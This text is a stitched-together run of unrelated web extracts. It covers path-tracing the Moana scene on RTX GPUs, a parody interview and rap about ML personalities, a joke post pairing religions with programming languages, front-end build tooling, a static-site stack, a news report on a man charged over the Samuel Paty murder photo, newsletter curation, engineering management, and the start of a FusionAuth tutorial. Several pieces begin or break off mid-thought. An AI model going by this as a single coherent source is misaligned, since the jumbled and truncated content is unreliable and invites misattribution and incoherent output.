<ul><li><strong>Envmap</strong>: The envmap not only comes in two forms (EXR for HDR, and png for the default PBRT model), it’s also super-important to exactly match the orientation used in the pbrt file: in particular, the envmap is <em>tilted </em>to the back to account for the fact that the default camera points downwards; if you don’t do that you see the envmap’s lower “ground” half peeking through betwen the ocean and the clouds, which is really disturbing. I had to literally copy pieces of Matt’s PBRT code over to make it match <img width="16" height="16" draggable="false" alt=":-/" src="https://s1.wp.com/wp-content/mu-plugins/wpcom-smileys/uneasy.svg"></li><li><strong>Instance count</strong>: The model has close on a 40 million instances (even <em>if</em> you make sure to only create those you need ….) – but early versions of OptiX only allowed 16 million per instance BVH. Early versions of OptiX didn’t allow multi-level instancing, either, so at times I had to have three “root” BVHes to trace into serially. Later versions used two-level instancing, which one root IAS over smaller second-level IASes …. which of course asks the question of “how do you best partigion 40 million instances into N groups of less than 16M each …. but I digress – since 7.1 OptiX can do more than 40 million, so this problem is gone.</li><li><strong>Number of tiny meshes:</strong>  Though the PBRT file contains some really big meshes, there are also a <em>lot </em>(!) of tiny ones. This was an issue mostly for OptiX 6, but even in OptiX 7 this would create a lot of different build inputs and SBT entries. Even worse, for some of the objects one ends up with a few really large meshes plus a ton of tiny ones, all in the same group/BVH…. which caused some other issues. </li><li><strong>Water</strong>: The water in this scene is actually particularly tricky: not only do you need a water shader at all, the water is also – in some parts of the model – modeled <em>twice</em> : there’s the main body of water in a giant box (with some low-frequency waves pattern on top), but there’s also a second surface with a higher-resolution tessellation of the waves within the default camera frustum. Now as long as you <em>only </em>use that default camera it’ll be OK, but once you move around, and some pixels refract the water twice, you get some really disturbing pictures.</li><li><strong>Memory</strong>: This model is big. Really big.       </li></ul>



<h2>Moana on RTX: Current State</h2>



<p>In its current state, my sandbox does the following:</p>



<ul><li><strong>Textures</strong>: To make the ptex-textures appear on the GPU I currently use some bake-out tool I wrote for exactly that purpose: For each of the input model’s polygon meshes I first re-construct the original quads, and bake out a tiny 16×16 texel “micro-texture” for each of those quads; these then get throws into a larger texture atlas that gets uploaded as a 2k-x-whatever CUDA texture. During rendering, the code material shader then reconstructs the current triangle’s corresponding texture coordinates within its corresponding mesh’s atlas, and uses a cuda bi-linear texture lookup. Total memory for that – at 16×16 texels per quad – is about 3.5GB, which isn’t too bad. I’m sure that this baking out does create some lower texture quality than PTex, but right now I’m pretty happy with it – it also saves a ton of memory (3.5GB vs 40-ish in original PTex files), and is super-fast (’cause I can use texture hardware …).</li><li><strong>Materials</strong>: Though I did have some Disney BRDF at some point in time (borrowed from Will’s ChameleonRT) I could never make this work with the water. Currently, I use the material’s “specTrans” value to determine if the material is water or not, and use either Pete Shirley’s RTOW “Dielectric” material (for water), or his “Lambertian” (for everything else). For the water I’m tracking whether I’m already in/out of the water, and just pass straight through any second water surface the path may encounter.</li><li><strong>Lights: </strong>I currently use a plain forward path tracer, until the path hits the environment map. All other light soruces get ignores, and even for the envmap I currently use only the LDR version, since that’s what the original PBRT file uses.</li><li><strong>Curves:</strong> Curves currently get tessellated into triangle meshes during loading. Since this generates a ton of additional geometry I use a very low tessellation rate, but still can’t see any artifacts from that, likely because the input patches are already pretty small.</li><li><strong>Triangle Meshes:</strong> every other geometry in this model is a triangle mesh, anyway. To avoid the many small meshes I currently merge all triangle meshes within a PBRT “object” into a single, large triangle mesh, and store, for each triangle in this model, an index of a tiny struct describing the corresponding sub-mesh’s data. This triangle mesh then gets uploaded to OWL, by creating the proper OWLGeom and OWLTrianglesGeomGroup. <br>To save on memory I do <em>not </em>use the <em>texcoord</em> and <em>primitiveID</em> arrays from the PBRT file, and simply compute this information on the fly in the CH program.</li><li><strong>Instances</strong>: For older versions of OptiX I had to do some extra steps with multiple BVHes and/or multi-level instancing; in the latest version this is no longer required: I simply create a single list of all instances, throw those into and OWLInstanceGroup, and done.</li><li><strong>Model import</strong>: I use my …</li></ul></div></div>

[Lex Fridman]
The following is a conversation with MOOC, Benchmark, and Q-Silver, famed superheroes of deep learning, computer vision, and reinforcement learning.

MOOC, Q-Silver and Benchmark are being interviewed by Lex. MOOC and Q-Silver smile, while Benchmark looks bored. Lex gushes, &quot;Wow. Just wow. I have been such a huge fan for years. So many amazing ML techniques and algorithms came together in just the right way today in what I really think will be remembered as a defining milestone of the AGI age. &quot;
Lex is now interviewing Grumpy. Lex, asks seriously, &quot;So, Grumpy, excuse my romanticized question, I’m Russian. I have to ask- What do you think is the meaning of life?&quot; Grumpy growls into the microphone.

[Cut to Siraj’s new video]
[Siraj Raval]
Yo Grumpy — You ain’t Lumpy
Stuck in that tree, nowhere to pee
You lit it up girl, Burning
Yearning for machine learning 
Eyes turning, to the sky, for drones
This cat moans for the AI revolution
The solution, my absolution, is convolution

My algorithms fly, my rhythm so sly
Don’t mean to rub it in yo faces
But my complicated Hilbert spaces
Are for the ages. They’re the rages. 
Start taking notes, you’ll need pages.

[turns stares at the camera]
Hello world, It's me. 

Word2Vec, Input in, Dot Product, Activate,	
Do it 1nce, do it 2wice, input out, errors done
I don’t need a label, I just learnt to do it without 1

<section><div itemprop="text"><p><strong>Python</strong>: It’s the obvious choice. Elegant, powerful, concise. But can you really see Jesus using a programming language named after the creature who tempted Eve and doomed humanity to exile from the Garden of Eden? No, me either.</p>
<p><strong>PERL</strong>: Its users swear by it, but lacking mainstream support or system level visual development interfaces, it’s unlikely the saviour of mankind would choose PERL for such a task.<span id="more-981"></span></p>
<p><strong>Visual Basic / .NET</strong>: Being a proprietary language, subject to licensing and usage restrictions Jesus would probably denounce such a framework, overturning tables and throwing the money lenders out of the temple.</p>
<p><strong>Objective C#</strong>: I can see Jesus coding for iOS mobile devices, spreading love and forgiveness via free iPhone apps. But being tied to the restricted iTunes store wouldn’t allow him to spread his apps to Android users.</p>
<p><strong>Java</strong>: Runs on all platforms and is truly object oriented, Java seems like a good choice for Jesus. Jesus on Java? Maybe. Although the language’s general slow speed and clunkiness aren’t the kind of cool Jesus wants.</p>
<p><strong>Ruby</strong>: Complex structures and language made easy. A higher level for better human understanding, Ruby sounds a lot like how Jesus operated. Unfortunately Ruby isn’t mainstream enough for someone like Jesus to consider if he wants to reach the masses.</p>
<p><strong>PHP: </strong>Freely available, open source, widely adopted, PHP also seems like a possible contender for Jesus’ next rapid development programming project. PHP just isn’t sophisticated enough to stand up against the bigger languages though. Maybe Jesus will port his apps to PHP when it gets some proper exception handling and performance improvements.</p>
<p><strong>C / C++</strong>: Being the most popular programming language(s) in the world, it’s quite possible that Jesus is a C/C++ programmer. Drawing on years of programming wisdom, and weaving itself into the fabric of modern society, C/C++ seem a natural fit for son of God.</p>
<p><a ref="magnificPopup" href="https://www.dnadigital.com.au/wp-content/uploads/2012/06/jesus.jpg"><img title="jesus" src="https://www.dnadigital.com.au/wp-content/uploads/2012/06/jesus.jpg" alt="" width="322" height="433" srcset="https://www.dnadigital.com.au/wp-content/uploads/2012/06/jesus.jpg 322w, https://www.dnadigital.com.au/wp-content/uploads/2012/06/jesus-223x300.jpg 223w" sizes="(max-width: 322px) 100vw, 322px"></a></p>
<p>If we look at all the worlds most popular religions and group them with the world’s most popular programming languages it looks like this :</p>
<p><strong>1. C/C++ | Christianity&nbsp;</strong><br><strong>2. JAVA | Muslims</strong><br><strong>3. PHP | Hindus</strong><br><strong>4. Javascript | Buddhists</strong><br><strong>5. Python | Sikhs</strong><br><strong>6. C# | Jews&nbsp;</strong></p>
<p>I will leave you to draw inferences and generalisations, but the last thing was need is a religious based programming language war. History has shown us that nerd flame wars are quite intense and uncivilised.</p>

	<time datetime="2020-10-26">October 26, 2020</time>
  
	<p>Modern web development is <a href="https://www.vrk.dev/2019/07/11/why-is-modern-web-development-so-complicated-a-long-yet-hasty-explanation-part-1/">notorious for being complicated</a> and a source of heated discussions around the web. Because of the endless new libraries and inter-mingled dependencies, making a simple web application has never been this complicated.</p>

<p>To illustrate, a new <a href="https://github.com/facebook/create-react-app">create-react-app</a> with TypeScript, sass, and bootstrap consumes around 536M of dependencies. That’s a half gigabyte to run a boilerplate web page: It’s beyond insanity! Is this complexity self-inflicted, or an outcome of a complex surface?</p>

<p>To find out, I set to create the development and build environments from scratch.</p>

<p>First, let’s set my requirements for the development environment and the final build.</p>

<ul>
<li><p><strong>Optimize for production</strong>: Typically, the production build will generate 3 files: <code>index.html</code>, <code>javascript.js</code> and <code>style.css</code> and a <code>resources</code> directory for files like images or fonts. Since I’m building <a href="https://en.wikipedia.org/wiki/Single-page_application">SPA</a>s, I don’t expect to have other web pages.</p></li>
<li><p><strong>One step</strong>: A single step (command) to make a final build of the web app. The same for kick-starting the development environment.</p></li>
<li><p><strong>TypeScript</strong>/<strong>Sass</strong>: These are personal preferences. TypeScript is recommended for large applications and Sass is nice to have.</p></li>
<li><p><strong>Live Reload</strong>: Changes automatically detected, and should trigger a re-build and refresh the browser.</p></li>
<li><p><strong>React</strong>, <strong>Bootstrap</strong>, <strong>Vuejs</strong> or <strong>Not</strong>:  Should be able to add React, Bootstrap, Vuejs or any other libraries. But should also be able to create the app without any dependencies; so no assumptions of frameworks.</p></li>
<li><p><strong>Minimal</strong>: Only include what we use; no more.</p></li>
</ul>

<p>There is an excess of options, any choice is going to be driven by personal preferences. I try to reason below what I picked.</p>

<ul>
<li><p><strong>gulp</strong>: <a href="https://gulpjs.com/">gulp</a> is a build tool that pipelines resources and transforms them. I like the idea of pipelining as it gives the flexibility to integrate with <em>any</em> program.</p></li>
<li><p><strong>webpack</strong>: <a href="https://webpack.js.org/">webpack</a> is primarily a module <em>bundler</em> that could be used as a build tool. I find gulp superior as a build tool, and webpack superior as a bundler/transpiler. So I mixed both.</p></li>
<li><p><strong>npm</strong>: yarn is the hot new thing for package management, but npm did catch up.</p></li>
<li><p><strong>browser-sync</strong>: <a href="https://browsersync.io/">Browsersync</a> is quite advanced and is very configurable. It also plays nicely with gulp.</p></li>
</ul>

<p>If this seems complicated, you don’t know the half of it. There are many  other plugins to use with gulp and webpack; and TypeScript is quite a challenge to get it to compile on reasonable performance.</p>

<p>The diagram below is actually a simplification of the whole workflow.</p>

<p><a href="https://svbtleusercontent.com/fk7oKCMeeZoRAXM5myvEBT0xspap.png"><img src="https://svbtleusercontent.com/fk7oKCMeeZoRAXM5myvEBT0xspap.png" alt="workflow.png"></a></p>

<p>The final boilerplate can be found in this Github repository: <a href="https://github.com/omarabid/front-root">front-root</a>. It’s still an experimental boilerplate, so use with caution.</p>

<p>There is a total of 5020 dependencies, 2590 of which are unique (non deduplicated). The total size of the <code>node_modules</code> directory is <code>287M</code>. So I guess we did a bit better than the react-create-app…</p>

<p>Here is the full list of the dependencies tree.</p>

October 26, 2020 | https://wearedignified.com/blog/how-we-built-ghost-static-site-generator | <a href="https://web.archive.org/web/*/https://wearedignified.com/blog/how-we-built-ghost-static-site-generator">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><blockquote><p><strong>TL;DR</strong> - We are using Eleventy and Gulp to generate individual HTML pages from Nunjucks templates. The content is saved as Markdown files and JSON collections for repeating styles. For blog and podcast content, we're using a Ghost self-hosted instance as our CMS API. Newsletter is handled by AWS SES and finally AWS Lambda serverless functions to handle our backend magic. All in all, development took approximately 13 full business days to complete this project.</p></blockquote><h2 id="whydowecare">Why do we care?</h2><p>Every technical decision is a serious decision. As much as we all preach "moving fast and breaking things", we still need to consider the amount of technical debt we are slowly creating with every decision. That being said, there's a clear sweet spot where you optimize for future flexibility while simultaneously allowing you to move quickly to build your product.</p><p>Some builds are larger than others. Let's take a SaaS product like Basecamp for example. You may choose to build your main product off a larger monolithic base such as Ruby on Rails or to separate each piece into multiple units to offer you more flexibility. Either way, you need to consider the balance between speed and flexibility. For Dignified, we decided to take a more fragmented micro-service approach and separate tasks into smaller pieces to avoid creating too much technical debt.</p><blockquote><p>If you are interested in a breakdown comparison of a micro-service approach over a monolithic approach, send me a tweet <a href="https://twitter.com/karlclement">@karlclement</a>!</p></blockquote><h2 id="howwedecided">How we Decided</h2><p>All of our choices were based on a few guiding rules:</p><ul><li>Anyone can regularly add new content</li><li>We have multiple content types with varying visual representations</li><li>We have a custom design</li><li>The website must render as fast as possible while fully implementing SEO tactics</li><li>Lightweight server footprint with minimal maintenance</li></ul><p>These items allowed us to pick and choose the tools we needed that fit the criteria. We can easily maintain a balance between speed and flexibility without diminishing the user's experience.</p><h2 id="thebreakdown">The Breakdown</h2><p>This is where it get's a bit technical, feel free to skip if you aren't interested in the implementation.</p><p>We started by separating our backend operations from our frontend rendering. This allows us to take advantage of SEO benefits and faster page loads while using multiple remote sources of content. This would also require static pages generated for every page on the site. Every time we update our content, each new page must be generated and deployed.</p><p>There are multiple libraries to help you generate static websites. Some of the most notable candidates are Jekyll, Hugo, Hexo, Eleventy, Gatsby and Nextjs. Gatsby and NextJs are heavily dependant on ReactJs for your component library. Jekyll, Hugo and Hexo have specific templating patterns to generate content, similar to Wordpress.</p><p>Finally we decided to use <a href="https://www.11ty.dev/">Eleventy</a>. Eleventy allows you to create any kind of template, with the templating language you want. It also allows you to pull content from locally available files or even hosted REST APIs.</p><h3 id="thecontent">The Content</h3><p>Since Eleventy allows you to pull content from external sources, we decided to use a very popular blogging platform known as <a href="https://ghost.org/">Ghost</a>. Other good candidates for external CMS platforms are Netlify CMS, Strapi, Forestry, Prismic, Contently and many more.</p><p>The only content we decided to pull from Ghost were blog posts and podcast summary posts. Since these two post types seem to follow a traditional blog post pattern, it was easy to create a template for each of these types in Eleventy.</p><p>Projects are then generated from a JSON content file with details and descriptions of each project we have worked on. This includes images, callouts, and calls to action. We needed to create a custom template with Eleventy for the project content type.</p><h3 id="templating">Templating</h3><p>Eleventy is very flexible when creating templates. You have the option to use Nunjucks, EJS, Handlebars, Mustache, Haml and many others. We decided to use the <a href="https://mozilla.github.io/nunjucks/">Nunjucks</a> templating library since it allowed us to embed more complex Javascript operations and macros in our templates.</p><p>With Nunjucks, we created individual templates to use each of the data types described above. Nunjucks also allows you to create partials and macros to be embeded in multiple places on the site similar to React or Angular components. These reusable pieces can also be used to layout templates used to provide a visual base for your template. In our case, we have three types of layout: a darker theme, lighter theme, and the sidebar theme.</p><p>To compile the Javascript, SCSS (Sass CSS) and HTML together, we used <a href="https://gulpjs.com/">GulpJs</a>. This allowed us to create a build script with commands to compile, convert, and compress our Javascript and SCSS in browser compatible code. We can also use these commands to prepare files for deploy to a production environment.</p><h3 id="hosting">Hosting</h3><p>Since we separated our platform into three main components, our frontend could be hosted on an entirely static platform (no need for a database or data processing). You have quite a few options for static hosting including Netlify, AWS S3, Surge.sh, Render, etc. Since we already love <a href="https://render.com/">Render</a>, we chose their static hosting solution. A huge benefit to Render is the deploy webhook that allows you to trigger a new compile and deploy when content changes.</p><p>Now to host our content for the blog and podcast posts, we are self hosting an instance of Ghost on a Digital Ocean droplet. If you are comfortable with DevOps, you can easily spin up a one-click Ghost droplet or even a Linux Ubuntu instance to install your Ghost CMS. Once you have your CMS ready, you can use it to manage your content and provide that information via a REST API. Ghost also allows you to send out a POST to a webhook when content is updated.</p><p>Finally, all processing like our email newsletter subscriptions and marketing campaigns are handled by NodeJs methods hosted on AWS Lambda. It's a very clean and scalable way to handle external operations that aren't available on static website hosting platforms.</p><blockquote><p>If you want me to detail the steps to hosting our site, or any of the steps above, tweet me at <a href="https://twitter.com/karlclement">@karlclement</a> and I can share that with you.</p></blockquote><h3 id="therest">The Rest</h3><p>The last pieces are mostly marketing tools for analytics and email communications. In order to make things as scalable as possible, we decided to use AWS SES (Simple Email Service) along with <a href="https://emailoctopus.com/">EmailOctopus</a> to handle our email newsletter. EmailOctopus has a great feature that allows you to make your newsletter campaign within their admin interface and send the emails with your own AWS account (which is free up to 62K emails per month).</p><p>AWS Lambda functions handle our newsletter subscriptions and segmentation. We can also enhance these tools to later include more A/B testing and customer service. Analytics are stored and monitored using Google Analytics, <a href="https://plausible.io/">Plausible</a>, and <a href="https://hotjar.com/">Hotjar</a>. This gives us a great view of how our visitors are using our website and what content they prefer to explore.</p><p>This concludes the list of all the tools we have used to deploy our latest build of wearedignified.com. If there is anything you want me to go into deeper detail or other subjects I should cover, please feel free to tweet me <a href="https://twitter.com/karlclement">@karlclement</a></p></section></div>]]>

                        <p>A young man who "liked" a gruesome Twitter picture showing French teacher Samuel Paty after he was murdered has been charged with glorifying terrorism, French authorities said Sunday.</p><p>Paty was attacked and killed on the street for showing his students cartoons of the Prophet Mohammed in a class on free speech.</p><p>His killer, an 18-year-old Chechen refugee who had been living in France since he was a child, was shot dead by police. Before his death he posted a picture of the teacher's severed head on Twitter.</p><p>The 22-year-old man charged on Sunday is also of Chechen origin, the public prosecutor in the central town of Blois, where he lives, said.</p><p>He was already on the radar of the authorities for having endorsed a massacre at the satirical magazine Charlie Hebdo that first published the Mohammed cartoons.</p><p>Several knives and other weapons were found at his home, prosecutor Frederic Chevallier.</p><p>The man denied being radicalised, Chevallier added.</p><p>Since Paty's murder on October 16 the French authorities have launched a clampdown on radical Islam.</p><p>Police have carried out dozens of raids on individuals and organisations suspected of supporting or abetting extremism.</p><p>Depictions of the Prophet Mohammed are considered sacrilegious by many Muslims.</p><p>But in France, which has a long tradition of satirising religion, they are seen as symbolic of free speech.</p>

    <div><p>I curate <a href="https://brainpint.com/">BrainPint</a>, a newsletter for the curious. It's a medley-style newsletter covering personal growth tips, interesting digital tools, business &amp; tech content and even random, rabbit hole internet finds. </p><p>I always aim to find signal within the noise, which means only 5-10% of the best content I discover each week finds its way into my newsletter. That's ~15 quality links.</p></div><p>I often get asked how I curate my newsletter every week. </p><p>In this post I'll give you a look behind the curtains. I'll share about the sources and tools I use to pick the best links and bring it all together. </p><h2 id="sources">Sources</h2><div><p>I read widely. Every week I go through around ~150 articles and 60+ newsletters. I also often find myself wandering down Internet rabbit holes. This means that I never run out of sources to curate from. </p><p>Having quality sources to draw content from is so important. If you're reading garbage, you won't have any meaningful content to curate from. Imagine a newsletter full of Buzzfeed articles?</p></div><figure><img src="https://janelloi.com/content/images/2020/10/Frame-22.png" alt="Sources Of Information - Product Hunt, YourStack, Newsletters, Twitter, Reddit" srcset="https://janelloi.com/content/images/size/w600/2020/10/Frame-22.png 600w, https://janelloi.com/content/images/size/w1000/2020/10/Frame-22.png 1000w, https://janelloi.com/content/images/2020/10/Frame-22.png 1012w" sizes="(min-width: 720px) 720px"><figcaption>Sources Of Information - Product Hunt, YourStack, Newsletters, Twitter, Reddit</figcaption></figure><h3 id="newsletters">Newsletters</h3><p>I'm a huge fan of newsletters, which are my go-to source of information. I love a good mix of curated newsletters &amp; ones that contain original writing. As a writer/curator myself, I respect the hard work that goes into each issue.</p><div><p>I'm subscribed to more than 60+ newsletters in different niches and read most of them. If you're wondering how to curate content for your niche, I recommend subscribing to industry publications.</p><p>It's hard to follow so many newsletters if you're strapped for time. However, I have just the suggestion to keep tabs on multiple things without going bonkers in the tools section below.</p></div><h3 id="product-hunt">Product Hunt</h3><div><p><a href="https://www.producthunt.com/">Product Hunt</a> is where you can find interesting new digital product launches daily. I love checking out the top few products each day. The upvote functionality means that quality products find their way to the top of the page. </p><p>I also visit <a href="https://betalist.com/">BetaList</a> to learn about new startups &amp; what they're creating.</p></div><h3 id="yourstack">YourStack</h3><div><p><a href="https://yourstack.com/">YourStack</a> is a community for users to share the products they love, and the reason why. People create their own stacks and add their favorite apps, books, gadgets, brands and more. By peering into others' stacks, I sometimes find gems to add to my newsletter. </p><p>If you have ever wondered "What does this person have on their homescreen?" "What watch does she wear?", you can get your answers on YourStack. It's now in public beta. You can <a href="https://yourstack.com/@JanelSGM">check out my stack.</a></p></div><h3 id="subreddits">Subreddits</h3><div><p>I trawl Twitter a lot and bookmark the best ideas and links using Twitter's native bookmark system, which admittedly isn't the best experience.

          <h3 id="the-single-most-important-thing-you-can-learn-as-a-software-engineer"><strong>The Single Most Important Thing You Can Learn as a Software Engineer</strong></h3>
<h3 id="learn-how-to-learn"><strong>Learn How To Learn</strong></h3>
<h6 id="3min-read"><em>3min read</em></h6>
<p>The web is filled with self-help articles showcasing titles like “How to become a senior software engineer” or “Top 10 technologies you must know in 2020”. There are literally thousands of them.</p>
<p>While many of these articles contain helpful advice, I believe all of them can be distilled into a single lesson:</p>
<p><strong>The single most important thing you can learn as a software engineer is to learn how to learn.</strong></p>
<h3 id="metaskills">Meta-Skills</h3>
<p>Learning how to learn is a meta-skill, which means it’s an ability that will enable you to grow in more than just one area. To name a few examples:</p>
<p>Learning React is a skill. Learning how to quickly pick up new UI frameworks and libraries is a meta-skill.</p>
<p>Learning to communicate effectively with your manager and peers is a skill. Learning how to best develop your emotional intelligence is a meta-skill.</p>
<h3 id="learning-how-to-learn">Learning How to Learn</h3>
<p>So, how do <em>you</em> learn best? Yes, you.</p>
<p>Do you learn from reading articles online? Do you go old-school and read physical copies of actual programming textbooks? Maybe you even spend hours scouring pages of documentation from W3C or MDN.</p>
<p>Do you watch videos online? Maybe you have a favorite YouTube channel or an account on a learning platform like Pluralsight, LinkedIn Learning, or Egghead.</p>
<p>Do you learn by doing? Do you enjoy building pet projects just to try out a new language, library, or framework? Do you practice with coding exercises on a platform like HackerRank or Codewars?</p>
<p>Do you learn from in-person presentations? Do you attend local meetups and conferences? Does your company have lunch-and-learn presentations where you can learn from your co-workers?</p>
<p>I personally use a combination of resources. I read a lot, write a lot, watch video courses, and build side projects. In the end though, it really doesn’t matter how you approach learning. What matters is that you find what works for you.</p>
<h3 id="benefits-of-learning-how-to-learn">Benefits of Learning How to Learn</h3>
<p>If you can master the meta-skill of learning how to learn, the world is full of possibilities. Not only can you pick up new skills, you can do so efficiently.</p>
<p>Need to learn a new programming language? No problem — you know how to understand the basic concepts and quirks of the language quickly.</p>
<p>Starting at a new company with an unfamiliar codebase? No problem — you know what you need to do to get up to speed and hit the ground running.</p>
<p>Looking for a career change? No problem — you know how to develop new abilities and teach yourself the material and skillset you need.</p>
<p><strong>Learn how to learn. Everything else will follow.</strong></p>

<![CDATA[Choosing the Management Track]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
    <p>Several months ago a friend of mine reached out to me because he was considering
changing from an individual contributor (IC) role to an engineering management (EM)
role at work. Given the fact that I’ve bounced back and forth a couple times, he
wanted to pick my brain as to what I thought the tradeoffs were and why I
ultimately went back into management.</p>

<p>He’s not the only person to reach out to me about this topic (in fact, a different
friend reached out a week later) so I figured it’d be useful to write a blog post
consolidating my thoughts. I’ll separate this post into two sections: some
significant and perhaps unintuitive changes that are relevant to someone
considering moving from IC to EM, and my personal motives.</p>

<h2 id="the-differences">The differences</h2>

<h3 id="1-you-wont-code-anymore">1: You won’t code anymore.</h3>

<p>I once heard some tongue-in-cheek advice about moving to management: “If the
thought of never coding anymore turns your life to ash, don’t move to management.”
Turns out it’s true.</p>

<p>The “should managers still code?” question is probably the most hotly debated
question about the role change, and I’m taking a side: no. Maybe not immediately
after the switch, because your team may be small enough that it needs your
technical contribution or you may still be the subject matter expert, but as
you climb the management ladder you will move further away from doing any
implementation work. In fact, I’ll argue that managers who cling to coding work
hold back the output of their team.</p>

<p>A popular assumption is this is an outflow of your technical skills becoming
stale. It’s not. I’m not saying it’s impossible, especially on a very extended
timetable that involves core structural shifts in industry practice, but I think
those shifts (and your inability to ramp up on them assuming a strong technical
base - see “<a href="https://charity.wtf/2017/05/11/the-engineer-manager-pendulum/">The Engineer/Manager Pendulum by Charity Majors</a>”)
are rare. The principles of sound software engineering practice are timeless.
But either track requires focus. It’s not that you can’t code, it’s more that
you shouldn’t - your schedule simply won’t allow it.</p>

<p>As a manager, your schedule will become so unavoidably non-deterministic that
you cannot be relied upon by the rest of your team to ship code changes on an
expected cadence. You won’t be able to respond to questions or pull requests
involving the code you previously wrote. You won’t have the bandwidth to ship
updates to that code when requirements change. And in the big picture this is a
problem, because teams distributing and shipping work in concert is the backbone
of successful software development.</p>

<p>The reason for this non-deterministic schedule is rooted in my second difference:</p>

<h3 id="2-management-forces-you-to-care-more-about-everything">2: Management forces you to care more about everything.</h3>

<p>Generally speaking, as an IC the measure of your impact is your individual technical
contribution: work scoped, code successfully deployed to production, RFCs proposed
and reviewed, etc. While this often involves working with others, at the end of
the day you are largely in control of the factors that determine your output. You
can sit at your desk and work more hours. You can write more / better code. You
can add more tests. The success or failure of your technical efforts have more
to do with your effort than anyone else’s.</p>

<p>One of my beliefs about management is borrowed directly from <a href="https://amzn.to/30XV84J">High Output Management by Andy Grove</a>:
the measure of a manager is the output of the organization underneath them. Unfortunately
the factors that sum to a team’s output are far fuzzier than the factors that sum
to an IC’s output. And it’s not as simple as adding up all of the discrete technical
outputs of your ICs because team output is measured via the delivery of coordinated,
high-quality projects over time.</p>

<p>Here are some not uncommon situations:</p>

<ul>
  <li>A team of talented ICs ships high quality work. But they feel no buy-in or
camaraderie within the team or greater organization, and the entire team turns
over within a year. The constant hiring and onboarding makes it difficult to rely
on this team for time-sensitive tasks or reliable ownership over part of a codebase.</li>
  <li>A set of teams spends an extended time working on a project that gets killed
before launch. Turns out it wasn’t the right thing to build. The ICs on that team
turned out high quality work but to a useless outcome.</li>
  <li>A team of talented ICs ships high quality work, but they have one or two very
senior brilliant jerks. Other teams do not like engaging with these brilliant
jerks so they avoid interacting with the team. Consequently the high quality work
of this team does not have organizational impact.</li>
</ul>

<p>A common thread between each of these scenarios is that ICs are delivering high
quality work. Another thread is that the high quality work ultimately doesn’t
benefit the organization. Retention problems, working on the wrong things, toxic
cultures - these are all examples of management failure.</p>

<p>There’s no checklist for building non-toxic cultures or a team that ICs want to
stay on. Engineering teams are fortunate if they’re told exactly what to build
every quarter to meet the growing technical and business needs of the company
but I’ve never found that to be true. The poor definition of these ideas makes
management hard. And it puts the burden on the manager to maintain their own
level of vigilance that all of these things - personalities, priorities, culture,
etc. - stay on track.</p>

<p>As a small but illustrative example of something that’s different as an IC than
a manager: morning standup. When I was an engineer, there were more than a few
times during morning standups when I didn’t pay attention unless I was giving
my own update. And frankly it didn’t seem to matter much, especially if the other
updates were concerning different workstreams than the one I was currently focused
on.</p>

<p>As a manager, I can’t afford not to pay attention to every update during standup
because I am ultimately accountable for the delivery of <em>every workstream</em>. Not
only am I trying to identify and surface team-wide blockers, but I need to know
when a junior teammate sounds like they’re spinning their tires or when a senior
teammate sounds burnt out. I’m mentally noting points I need to follow up on
during my weekly 1:1s, what projects feel like they’re falling off original
timetables or communication problems my teammates are encountering across the
organization. Is a teammate overwhelmed? Is a teammate dragging their heels?
What if I’m hearing reports that a teammate has been toxic in meetings? These are
all concerns running constantly in the back of my mind.</p>

<p>This is the root of the non-deterministic schedule from the first point. Say I
smell one of these things - a teammate is very disengaged and unhappy? A project
is going off the rails? A teammate suddenly gives their two week notice? These
are my fires now.</p>

<p>Gone are the weeks of deterministic bandwidth calculated via possible work hours
divided by ticket estimations. And that unpredictability means my outdated pull
request that unblocks another teammate goes days or weeks without being merged.</p>

<p>Is there room every once in a while for an EM to work on a non-blocking PR just
to scratch their coding itch? Probably. Is the work time you spent working on that
nice-to-have PR better spent on a management responsibility? Probably.</p>

<p>My advice: find time to scratch the coding itch outside of work.</p>

<p>A side effect of caring more about everything means management costs you more
emotionally. When hardship or tragedy strikes the life of a teammate and it affects
their ability to work, I’m often the first to know. Depending on the sensitivity
of the issue sometimes I’m the only one to know. Not only am I responsible for the
practical fallout of their absence, but I wouldn’t be successful in my job if I
didn’t genuinely care about the wellbeing of my teammates. And in my experience
it’s not free to know people you care about are suffering.</p>

<h3 id="3-management-creates-an-unavoidable-power-hierarchy">3: Management creates an unavoidable power hierarchy.</h3>

<p>As a manager you have direct power to decide your reports’ continued employment
and compensation in a manner in which they cannot do for you, which means you
have more power over them at work than they do over you. This isn’t a statement
of right or wrong, this is a statement of fact.</p>

<p>I think there are a few non-obvious practical implications of this power hierarchy:</p>

<p><strong>You will feel more compelled to toe the company line.</strong></p>

<p>You represent the company now within your sphere of influence. While I don’t
think moving into management means you lose your capacity for independent thought,
the health of an organization often depends on its leaders’ ability to disagree
and commit.</p>

<p>This particularly comes to a head during times of crises, as those on your team
will look to you as a steadying force and source of information. By virtue of your
title you may know not-yet-public information and be expected to keep that information
private until the appropriate plans are in place, all for the good of the company.
Sometimes that news will be devastating and you’ll take heat for keeping it quiet
from people who trusted you. That’s part of the job.</p>

<p><strong>It can be hard to manage friends.</strong></p>

<p>The foundations of friendship are things like equality, honesty, and transparency,
principles which don’t always jive with a management relationship. Management is a
power hierarchy (<code>!equality</code>), and sometimes you’ll have to disagree and commit or
toe the party line (<code>!honesty</code> / <code>!transparency</code>).</p>

<p>The alternative is special treatment for your friends, which is a management failure
because nepotism undermines your credibility as a leader. And in the worst case,
you are in the unenviable position of having to terminate a friend’s employment.
That too is part of the job.</p>

<p><strong>You can’t joke around the same way.</strong></p>

<p>Here’s a a bad joke you can make as an IC that doesn’t land as well as a manager:
“Welp, you broke production. Pack your things, you’re fired.”</p>

<p>The power dynamics of management are serious and livelihoods are at stake. Don’t
trivialize them with jokes.</p>

<p>First, we will set up the FusionAuth server. Then, we’ll configure the golang program to construct a URL to direct a user to a login form generated by FusionAuth. Lastly, we will learn how to make use of an access token in order to get user data using OIDC.</p>

<p>You can follow along conceptually, or check out the <a href="https://github.com/fusionauth/fusionauth-example-go">GitHub repo</a> with the complete implementation first. Now, let’s get started!</p>

<h2 id="requirements">Requirements</h2>

<p>The requirements to follow this tutorial are as follows:</p>

<ul>
  <li>Go SDK</li>
  <li>VScode or any other text editor</li>
  <li>FusionAuth</li>
  <li>Homebrew (optional)</li>
</ul>

<h2 id="setting-up-fusionauth-as-your-auth-provider">Setting up FusionAuth as your auth provider</h2>

